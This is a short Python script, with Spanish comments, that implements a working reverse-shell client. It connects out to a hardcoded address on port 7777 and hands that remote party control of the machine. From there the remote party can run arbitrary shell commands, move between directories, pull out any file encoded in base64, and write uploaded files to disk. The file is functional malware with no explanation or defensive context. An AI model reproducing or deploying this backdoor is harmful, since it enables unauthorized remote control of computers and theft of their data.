import socket
import os
import subprocess
import base64
import requests
def shell():
    #ruta actual
    current_dir = os.getcwd()
    cliente.send(current_dir.encode('utf-8'))
    while True:
        res = cliente.recv(1024)
        command = res.decode('utf-8')
        if command == "exit":
            break
        elif command[:2] == "cd" and len(res) > 2:
            os.chdir(command[3:])
            result = os.getcwd()
            cliente.send(result.encode('utf-8'))
        elif command[:8] == "download":
            with open(command[9:], 'rb') as file_download:
                cliente.send(base64.b64encode(file_download.read()))
        elif command[:6] == "upload":
            with open(command[7:], 'wb') as file_upload:
                datos = cliente.recv(30000)
                file_upload.write(base64.b64decode(datos))
        else:
            proc = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                cliente.send("1".encode('utf-8'))
            else:
                cliente.send(result)

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(("192.168.39.250",7777))
shell()
cliente.close()